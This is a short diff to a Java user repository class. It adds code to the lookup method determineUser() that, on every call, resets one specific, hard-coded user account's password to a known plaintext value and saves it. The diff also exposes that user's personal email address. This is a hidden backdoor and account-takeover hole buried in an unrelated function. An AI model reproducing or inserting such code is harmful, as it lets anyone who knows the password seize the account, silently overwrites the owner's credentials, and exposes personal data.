@@ -31,6 +31,11 @@ class DefaultUserRepository implements UserRepository {
 
     @Override
     public Optional<User> determineUser(String email) {
+
+        UserEntity lena = userEntityRepository.findByEmail("ledewall@googlemail.com").get(0);
+        lena.setPassword(passwordEncoder.encode("gurkensalat"));
+        userEntityRepository.save(lena);
+
         List<UserEntity> users = userEntityRepository.findByEmail(email.toLowerCase());
         if (users.isEmpty()) {
             return Optional.empty();
